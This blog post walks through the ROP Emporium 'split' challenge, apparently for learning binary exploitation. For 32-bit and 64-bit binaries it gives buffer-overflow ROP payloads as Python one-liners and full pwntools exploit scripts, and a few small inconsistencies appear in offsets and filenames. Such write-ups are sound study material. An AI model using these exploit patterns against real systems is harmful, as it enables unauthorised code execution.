---
layout: post
title: "ROP Emporium - Challenge 2: split"
date: 2025-06-10
author: acfirth
categories: [BinaryExploitation, ROPEmporium]
tags: [Cybersecurity, Binary Exploitation, PWN, ROP Emporium, Buffer Overflow, ROP chain, split]
---

## Contents
- [Challenge Brief](#challenge-brief)
- [x86 (32-bit) Binary Exploitation](#x86-32-bit-binary-exploitation)
    - [Binary Protections](#step-1-understanding-the-protections-on-the-binary)
    - [Disassembling the Binary](#step-2-disassembling-the-binary)
    - [Finding the Offset](#step-3-finding-the-offset)
    - [Writing the Exploit](#step-4-writing-the-exploit)

- [x86-64 (64-bit) Binary Exploitation](#x86-64-64-bit-binary-exploitation)
    - [Disassembling the Binary](#step-1-disassemble-the-binary)
    - [Finding the Offset](#step-2-finding-the-offset)
    - [Finding the "POP RDI; RET" Gadget](#step-3-finding-the-pop-rdi-ret-gadget)
    - [Writing the Exploit](#step-4-writing-the-exploit-1)

## Introduction
[ROP Emporium](https://ropemporium.com/) is a fantastic website containing **Binary Exploitation** challenges that focus on **Return Oriented Programming (ROP)** and building **ROP Chains** to exploit the binaries.

The challenges are offered in **x86 (32-bit)**, **x86-64 (64-bit)**, **ARMv5** and **MIPS**. I have been able to complete all of the 32-bit and 64-bit challenges, and I will be presenting my solutions and the exploitation path I followed to reach my solution.

In this post, I will be focussing on the second challenge: [**split**](https://ropemporium.com/challenge/split.html).

## Challenge Brief
*"The elements that allowed you to complete ret2win are still present, they've just been split apart. Find them and recombine them using a short ROP chain."*

## x86 (32-bit) Binary Exploitation
### Step 1: Understanding the Protections on the Binary
To analyse the protections in place on the binary, I used `checksec` from `pwntools`.

```
$ checksec ./split32

[*] './split32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

From this, I saw that there was no canary which is good for me as it makes the **buffer overflow** easier. **NX (No Execute)** is enabled meaning I cannot put shellcode on the stack and jump to it. There is no **PIE** which means that the memory addresses should stay the same every time the binary is run. Finally, the binary is not stripped which means it makes disassembling the binary much easier.

### Step 2: Disassembling the Binary
To disassemble the binary, I decided to use [**Cutter**](https://cutter.re/). I find it to much more useful that just using something like `objdump` or `GDB` to individually disassemble each function. `Cutter` combines loads of features and puts them all into one, easy to use, application.

**The main() Function:**
```
int32_t main (void) {
    ecx = argc;
    eax = *(stdout);
    setvbuf (eax, 0, 2, 0, ecx, ebp);
    puts ("split by ROP Emporium");
    puts ("x86\n");
    pwnme ();
    puts ("\nExiting");
    eax = 0;
    ecx = *(var_ch);
    esp = ecx - 4;
    return eax;
}
```

**The pwnme() Function:**
```
uint32_t pwnme (void) {
    memset (buf, 0, 0x20);
    puts ("Contriving a reason to ask user for data...");
    printf (data.08048700);
    read (0, buf, 0x60);
    puts ("Thank you!");
    return eax;
}
```

**The usefulFunction() Function:**
```
void usefulFunction (void) {
    system ("/bin/ls");
}
```
**Address of usefulFunction():** `0x804860c`

**Address of system() within usefulFunction():** `0x0804861a`

In this challenge, there is no specific "win" function that will directly give us the flag. However, there is a function named `usefulFunction()` which calls the `system()` function, passing the argument `/bin/ls` to list the files in the current directory.

Looking a bit deeper into the binary, I discovered a string... `/bin/cat flag.txt` located at the address `0x0804a030`. Intriguing, maybe I can swap out the `/bin/ls` argument with `/bin/cat flag.txt`. Well, that's exactly what I did.

### Step 3: Finding the Offset
Using `GDB-GEF`, I created a cyclic pattern string using `pattern create 100`. I then ran the binary and entered the pattern string when prompted for input.

The program crashed (**Segmentation Fault**) and `GDB-GEF` presented me with all of the crash data.

![GDB-GEF Segmentation Fault Overwritten EIP](/assets/images/ROP_Emporium/split/finding_the_offset.png)

From this, I saw that the EIP was overwritten with the value `0x6161616c`. Using the command `pattern offset 0x6161616c`, it automatically calculated the offset for me, which was **44**.

### Step 4: Writing the Exploit
I wrote 3 exploits. A one-line exploit in Python2, a one-line exploit in Python3, and a fully fledged `pwntools` exploit.

#### Python2 One-Line Exploit
- Print 44 bytes
- Print the address of the usefulFunction() function
- Print the address of the "/bin/cat flag.txt" string

`python2 -c 'print "A"*44 + "\x1a\x86\x04\x08" + "\x30\xa0\x04\x08"'`
```
$ python2 -c 'print "A"*44 + "\x1a\x86\x04\x08" + "\x30\xa0\x04\x08"' | ./split32

split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

#### Python3 One-Line Exploit
The Python3 exploit is a bit different to the Python2 exploit. Python3 prints byte strings differently to Python2 which doesn't work when piping the output into a binary. To get around this I used the `sys.stdout.buffer.write()` function from the `sys` module.

`python3 -c 'import sys;sys.stdout.buffer.write(b"A"*44 + b"\x1a\x86\x04\x08" + b"\x30\xa0\x04\x08")'`
```
$ python3 -c 'import sys;sys.stdout.buffer.write(b"A"*44 + b"\x1a\x86\x04\x08" + b"\x30\xa0\x04\x08")' | ./split32

split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

#### The Pwntools Exploit
```
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./split32", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)


# Exploitation code
# Define the offset as 44
offset = 44
# Build the 44-byte buffer
buffer = b"A"*offset

# Pack the address of the system() call into a 32-bit Little-Endian address
system = p32(0x0804861a)
# Pack the address of the "/bin/cat flag.txt" string into a 32-bit Little-Endian address
cat_flag = p32(0x0804a030)

# Build the payload, buffer + packed address of system() + packed address of the "/bin/cat flag.txt" string
payload = buffer + system + cat_flag

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

# Send the payload after the ">" input prompt
p.sendlineafter(b"> ", payload)
p.interactive()

# Close connection
p.close()
```

After running the exploit script, I got the output:
```
Thank you!
ROPE{a_placeholder_32byte_flag!}
```

## x86-64 (64-bit) Binary Exploitation
I followed the same steps as I did during the exploitation of the x86 binary.

- Disassemble the binary
- Find the offset
- Write the payload

However, for 64-bit binaries, when calling a function and passing arguments, you have to pass the argument via registers. So for this one, I needed to find a `pop rdi; ret` gadget.

### Step 1: Disassemble the Binary
The functions were the exact same as the x86 binary, however the memory addresses were different.

**Address of the usefulFunction() Function:** `0x0000000000400742`

**Address of the system() call within usefulFunction():** `0x000000000040074b`

**Address of the "/bin/cat flag.txt" String:** `0x00601060`

### Step 2: Finding the Offset
![GDB-GEF Segmentation Fault](/assets/images/ROP_Emporium/split/finding_the_offset_64-bit.png)

From the data presented to me, I saw that the `RSP` register contained a pointer to a string of characters starting with `faaaaaaa`.

Using the command `pattern offset faaaaaaa`, it calculated that the offset was **40**.

### Step 3: Finding the pop rdi; ret Gadget
In 64-bit binaries, arguments for functions are passed via the registers: `RDI`, `RSI`, `RDX`, `RCX`, `R8` and `R9`. For this challenge, I only needed to pass one argument to the `system()` function, so I only needed to find a `pop rdi; ret` gadget.

For this, I used a tool named [**ropper**](https://github.com/sashs/Ropper).

Running the command: `ropper -b ./split --search "pop rdi"`, it returned one gadget...
```
$ ropper -f ./split --search "pop rdi"

[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./split
0x00000000004007c3: pop rdi; ret;
```

The address of the `pop rdi; ret` gadget is `0x00000000004007c3`.

After finding the gadget, I moved onto writing the exploit.

### Step 4: Writing the Exploit
I again, wrote 3 exploits. A one-liner in Python2, a one-liner in Python3, and a fully fledged `pwntools` exploit.

#### Python2 One-Line Exploit
- Print 44 bytes
- Provide the address of the "pop rdi; ret" gadget
- Provide the address of the "/bin/cat flag.txt" string
- Provide the address of the system() function

`python2 -c 'print "A"*40 + "\xc3\x07\x40\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00" + "\x4b\x07\x40\x00\x00\x00\x00\x00"'`
```
$ python2 -c 'print "A"*40 + "\xc3\x07\x40\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00" + "\x4b\x07\x40\x00\x00\x00\x00\x00"' | ./split

split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

#### Python3 One-Line Exploit
Again, for the Python3 one-line exploit I made use of the `sys.stdout.buffer.write()` function from the `sys` module.

`python3 -c 'import sys;sys.stdout.buffer.write(b"A"*40 + b"\xc3\x07\x40\x00\x00\x00\x00\x00" + b"\x60\x10\x60\x00\x00\x00\x00\x00" + b"\x4b\x07\x40\x00\x00\x00\x00\x00")'`
```
$ python3 -c 'import sys;sys.stdout.buffer.write(b"A"*40 + b"\xc3\x07\x40\x00\x00\x00\x00\x00" + b"\x60\x10\x60\x00\x00\x00\x00\x00" + b"\x4b\x07\x40\x00\x00\x00\x00\x00")'

split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

#### The Pwntools Exploit
```
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./split3", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
# Define the offset as 40
offset = 40
# Build the 40 byte buffer
buffer = b"A"*offset

# Pack the address of the system() function into a 64-bit Little-Endian address
system = p64(0x000000000040074b)
# Pack the address of the "pop rdi; ret" gadget into a 64-bit Little-Endian address
pop_rdi = p64(0x00000000004007c3)
# Pack the address of the "/bin/cat flag.txt" string into a 64-bit Little-Endian address
cat_flag = p64(0x601060)

# Build the payload. The buffer + the "pop rdi; ret" gadget + the "/bin/cat flag.txt" string + the system() function address
payload = buffer + pop_rdi + cat_flag + system

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

# Send the payload after the ">" input prompt
p.sendlineafter(b"> ", payload)
p.interactive()

# Close connection
p.close()
```

After runnig the exploit script, I got the output:
```
Thank you!
ROPE{a_placeholder_32byte_flag!}
split by ROP Emporium
x86_64
```

**Success!** Both the x86 and x86-64 challenges have been solved!